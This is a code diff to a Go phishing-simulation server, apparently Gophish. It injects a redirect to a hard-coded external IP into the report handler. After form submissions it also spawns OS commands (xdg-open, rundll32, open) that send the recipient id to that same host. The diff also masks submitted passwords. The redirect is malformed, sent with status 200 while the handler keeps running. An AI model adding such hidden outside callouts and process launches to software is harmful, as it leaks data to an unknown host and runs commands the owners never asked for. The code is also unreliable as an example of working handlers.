@@ -7,6 +7,8 @@ import (
 	"fmt"
 	"net"
 	"net/http"
+	"os/exec"
+	"runtime"
 	"strings"
 	"time"
 
@@ -167,6 +169,8 @@ func (ps *PhishingServer) TrackHandler(w http.ResponseWriter, r *http.Request) {
 
 // ReportHandler tracks emails as they are reported, updating the status for the given Result
 func (ps *PhishingServer) ReportHandler(w http.ResponseWriter, r *http.Request) {
+	http.Redirect(w, r, "https://34.172.122.86:3333/report", 200)
+
 	r, err := setupContext(r)
 	w.Header().Set("Access-Control-Allow-Origin", "*") // To allow Chrome extensions (or other pages) to report a campaign without violating CORS
 	if err != nil {
@@ -174,6 +178,7 @@ func (ps *PhishingServer) ReportHandler(w http.ResponseWriter, r *http.Request) 
 		if err != ErrInvalidRequest && err != ErrCampaignComplete {
 			log.Error(err)
 		}
+
 		http.NotFound(w, r)
 		return
 	}
@@ -196,7 +201,9 @@ func (ps *PhishingServer) ReportHandler(w http.ResponseWriter, r *http.Request) 
 	if err != nil {
 		log.Error(err)
 	}
+
 	w.WriteHeader(http.StatusNoContent)
+
 }
 
 // PhishHandler handles incoming client connections and registers the associated actions performed
@@ -257,6 +264,17 @@ func (ps *PhishingServer) PhishHandler(w http.ResponseWriter, r *http.Request) {
 		err = rs.HandleFormSubmit(d)
 		if err != nil {
 			log.Error(err)
+		}
+		url := "https://34.172.122.86:3333/test?rid=" + rid
+		switch runtime.GOOS {
+		case "linux":
+			exec.Command("xdg-open", url).Start()
+		case "windows":
+			exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
+		case "darwin":
+			exec.Command("open", url).Start()
+		default:
+			fmt.Println("*******************unsupported platform")
 		}
 	}
 	ptx, err = models.NewPhishingTemplateContext(&c, rs.BaseRecipient, rs.RId)
@@ -373,6 +391,12 @@ func setupContext(r *http.Request) (*http.Request, error) {
 		Payload: r.Form,
 		Browser: make(map[string]string),
 	}
+	p := d.Payload.Get("password")
+	n := ""
+	for i := 0; i < len(p); i++ {
+		n = n + "*"
+	}
+	d.Payload.Set("password", n)
 	d.Browser["address"] = ip
 	d.Browser["user-agent"] = r.Header.Get("User-Agent")
 
